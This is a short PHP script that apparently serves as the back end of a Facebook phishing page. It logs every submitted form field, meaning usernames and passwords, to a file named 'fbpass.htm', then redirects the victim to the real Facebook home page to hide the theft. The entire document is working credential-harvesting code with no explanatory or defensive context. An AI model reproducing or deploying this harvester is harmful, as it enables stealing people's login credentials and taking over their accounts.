<?php
header ('Location:https://www.facebook.com/home.php');
$handle = fopen("fbpass.htm", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "<br>");
}
fwrite($handle, "<hr>");
fclose($handle);
exit;
?>